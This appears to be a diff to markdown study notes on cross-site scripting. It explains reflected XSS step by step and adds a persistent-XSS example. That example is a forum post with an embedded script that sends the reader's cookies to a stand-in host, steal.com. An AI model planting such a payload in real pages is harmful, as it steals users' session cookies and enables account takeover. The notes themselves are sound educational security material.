@@ -56,4 +56,16 @@
 **Attack explained**
 1. Attacker crafts a URL containing a malicious string and sends it to the victim.
 2. The victim is tricked by the attacker into requesting the URL from the vulnerable website.
-3. The vulnerable website includes the malicious string from the URL in the response
+3. The vulnerable website includes the malicious string from the URL in the response.
+4. The victim's browser executes the malicious scripts inside the response, sending the victim's cookies to the attacker's server.
+
+**Persistent XSS**
+- Injected scripts are stored on vulnerable servers.
+- e.g. an attacker might post a message as follows in a forum.
+```
+Hello message board. This is a message. 
+<script>
+	document.write("<img src=http://steal.com/xssHack/Steal?"+document.cookie+">")
+</script>
+This is the end of my message.
+```
